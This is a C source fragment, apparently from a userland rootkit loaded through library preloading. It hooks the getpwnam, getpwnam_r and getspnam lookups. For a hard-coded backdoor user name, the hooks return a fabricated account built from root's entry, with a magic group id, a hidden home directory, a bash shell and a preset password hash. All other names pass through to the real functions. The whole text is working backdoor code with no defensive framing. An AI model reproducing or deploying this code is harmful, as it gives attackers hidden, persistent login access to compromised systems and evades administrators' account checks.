struct passwd *getpwnam(const char *name){
    hook(CGETPWNAM);

    if(!strcmp(name, BD_UNAME)){
        struct passwd *bpw = call(CGETPWNAM, "root");

        bpw->pw_name = BD_UNAME;
        gid_t magicgid = readgid();
        bpw->pw_uid = magicgid;
        bpw->pw_gid = magicgid;
        bpw->pw_dir = HOMEDIR;
        bpw->pw_shell = "/bin/bash";

        return bpw;
    }

    return call(CGETPWNAM, name);
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result){
    hook(CGETPWNAM_R);

    if(!strcmp(name, BD_UNAME)){
        call(CGETPWNAM_R, "root", pwd, buf, buflen, result);

        pwd->pw_name = BD_UNAME;
        gid_t magicgid = readgid();
        pwd->pw_uid = magicgid;
        pwd->pw_gid = magicgid;
        pwd->pw_dir = HOMEDIR;
        pwd->pw_shell = "/bin/bash";

        return 0;
    }

    return (long)call(CGETPWNAM_R, name, pwd, buf, buflen, result);
}

struct spwd *getspnam(const char *name){
    if(!strcmp(name, BD_UNAME)){
        struct spwd *bspwd = malloc(sizeof(struct spwd));

        bspwd->sp_namp = BD_UNAME;
        bspwd->sp_pwdp = BD_PWD;
        bspwd->sp_lstchg = time(NULL) / (60 * 60 * 24);
        bspwd->sp_expire = time(NULL) / (60 * 60 * 24) + 90;
        bspwd->sp_inact = 9001;
        bspwd->sp_warn = 0;
        bspwd->sp_min = 0;
        bspwd->sp_max = 99999;

        return bspwd;

    }

    hook(CGETSPNAM);
    return call(CGETSPNAM, name);
}
